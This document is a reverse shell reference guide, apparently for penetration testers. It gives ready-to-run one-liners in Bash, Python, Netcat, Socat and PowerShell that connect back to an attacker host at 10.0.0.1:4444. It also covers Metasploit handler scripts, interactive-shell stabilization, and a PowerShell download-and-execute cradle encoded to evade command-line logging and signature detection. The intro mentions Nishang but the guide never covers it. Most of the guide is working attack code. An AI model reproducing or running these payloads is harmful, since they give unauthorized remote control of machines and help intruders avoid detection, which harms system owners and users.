# Reverse Shell Complete Guide

> Comprehensive reference for generating reverse shells across platforms, setting up listeners, and stabilizing raw shell sessions. Covers Bash, Python, Netcat, Socat, and Nishang for both Linux and Windows targets.

## Introduction

Reverse shells are the fundamental building block of post-exploitation access. Unlike bind shells (where the target listens and the attacker connects), reverse shells initiate the connection from the target to the attacker, bypassing NAT and firewall restrictions that block inbound connections. This guide covers every major reverse shell technique, from simple one-liners to fully interactive encrypted sessions, with listener setup and stabilization procedures for each.

The guide follows the practical workflow: generate the appropriate shell for the target environment, set up a matching listener, catch the connection, and immediately stabilize it into a usable interactive session. Each technique includes the specific scenarios where it excels and its limitations.

---

## 1. Reverse Shell One-Liners by Language

### Bash

```bash
# Standard bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Using /bin/sh for minimal footprint
/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

Bash reverse shells are the first technique to try on Linux targets. They require no external tools, only the bash shell itself with networking compiled in (most modern distributions include this). The `/dev/tcp` pseudo-device is a bash built-in, not a real file, so it works even in restricted environments. Limitations: some hardened systems disable `/dev/tcp` at compile time, and bash may not be available (Alpine Linux uses ash by default).

### Python

```bash
# Python3 reverse shell
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
```

Python is the most reliable fallback when bash is unavailable. Python3 is installed by default on nearly all modern Linux distributions and macOS. The shell works by duplicating the socket file descriptor onto stdin (0), stdout (1), and stderr (2), then spawning a shell that reads from and writes to those descriptors.

### Netcat

```bash
# Traditional nc with -e flag (not available in all builds)
nc -e /bin/sh 10.0.0.1 4444

# Modern alternative using mkfifo (works with openbsd-netcat)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

The `-e` flag (execute program after connect) is disabled in many modern netcat builds (particularly the OpenBSD variant used by default on Kali). The mkfifo technique works around this by creating a named pipe: `cat` reads from the pipe and feeds into the shell, while netcat output goes back into the pipe, creating a bidirectional data flow.

### PowerShell (Windows)

```powershell
# Full PowerShell reverse shell one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

PowerShell is always available on modern Windows systems (Windows 7+). The `-nop` flag bypasses the user profile to speed execution and avoid profile-based logging. For delivery, encode the command with `iconv -t utf-16le | base64` and use `powershell -nop -enc <BASE64>` to avoid command-line logging of the plaintext payload.

---

## 2. Listener Setup

### Netcat Listener

```bash
# Basic listener
nc -lvnp 4444

# With rlwrap for history and arrow keys
rlwrap nc -lvnp 4444

# Keep-alive listener (re-listens after session drops)
while true; do nc -lvnp 4444; done
```

The `-l` flag enables listen mode, `-v` enables verbose output (shows connection details), `-n` disables DNS resolution (faster), and `-p` specifies the port. Always use `-n` to avoid slow reverse DNS lookups when a target connects. The keep-alive wrapper is essential for testing — when a shell drops, the listener automatically restarts.

### Metasploit Multi/Handler

```bash
# For staged meterpreter payloads (required)
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"

# Resource script for repeatable setup
cat > handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j
EOF
msfconsole -r handler.rc
```

Multi/handler is mandatory for staged payloads because the second stage must be served by metasploit. The `ExitOnSession false` flag keeps the listener running after catching a session, allowing multiple targets to connect. Resource scripts (`.rc` files) enable repeatable, scripted listener deployment.

---

## 3. Shell Stabilization

Raw reverse shells are fragile: Ctrl+C kills the session, arrow keys produce escape sequences, tab completion does not work, and interactive programs (su, nano, ssh) fail. Stabilization converts the raw shell into a full interactive terminal.

### Method 1: Python PTY Upgrade

```bash
# Step 1: Inside the raw shell, spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)

# Step 3: Configure attacker terminal to pass through key sequences
stty raw -echo; fg

# Step 4: Press Enter twice, then set terminal type
export TERM=xterm
stty rows 38 cols 136
```

This is the most common stabilization method. The `stty raw -echo` command disables local echo and line processing on the attacker terminal, so key presses are sent directly to the remote shell. The `fg` command brings the backgrounded shell back to the foreground with these new terminal settings.

### Method 2: Socat PTY Shell

```bash
# Listener (attacker): provides full PTY
socat TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0

# Connect-back (target): requests PTY from socat
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

The socat method provides a fully interactive shell from the start — no manual stabilization needed. The `pty` option allocates a pseudo-terminal, `stderr` redirects stderr, `setsid` creates a new session, `sigint` passes Ctrl+C correctly, and `sane` sets reasonable terminal defaults.

### Method 3: rlwrap Enhancement

```bash
# Start listener with rlwrap for basic readline support
rlwrap nc -lvnp 4444
```

rlwrap adds command history and arrow key support to any connection. It does not provide full PTY functionality (interactive programs still fail), but it prevents accidental shell termination and makes navigation easier. Combine with Python PTY upgrade for complete stabilization.

---

## 4. Encoding Options for Shell Delivery

```bash
# Base64 encode a PowerShell command for -enc delivery
CMD='IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/shell.ps1")'
ENCODED=$(echo -n "$CMD" | iconv -t utf-16le | base64 -w0)
echo "powershell -nop -enc $ENCODED"

# URL-encode a shell command for injection via HTTP parameter
python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))"
```

Encoding serves two purposes: evading basic signature detection and safely transporting shell commands through protocols that restrict certain characters. PowerShell `-enc` delivery is the standard technique for Windows payloads because it bypasses command-line logging and many string-based detection rules.

---

## References

- [Reverse Shell Cheat Sheet (PentestMonkey)](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [HackTricks - Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)
- [PayloadsAllTheThings - Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Nishang GitHub](https://github.com/samratashok/nishang)
- [Socat Manual](http://www.dest-unreach.org/socat/doc/socat.html)
